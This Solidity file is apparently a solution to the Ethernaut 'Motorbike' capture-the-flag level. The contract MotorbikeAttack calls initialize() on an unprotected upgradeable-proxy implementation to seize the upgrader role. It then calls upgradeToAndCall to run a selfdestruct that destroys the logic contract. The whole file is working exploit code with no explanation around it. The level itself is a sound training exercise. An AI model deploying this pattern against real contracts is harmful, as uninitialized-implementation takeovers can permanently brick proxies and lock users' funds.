// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external;
}

contract MotorbikeAttack {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    // logic contract address
    function attackPrepare(address _targetAddress) public {
        IEngine(_targetAddress).initialize();
    }

    // logic contract address
    function attack(address _targetAddress) external {
        bytes memory data = abi.encodeWithSignature("destory()");
        // bytes memory data = '';

        IEngine(_targetAddress).upgradeToAndCall(address(this), data);
    }

    function destory() public {
        selfdestruct(payable(owner));
    }

    function initialize() external {
        horsePower = 1000;
        upgrader = owner;
    }
}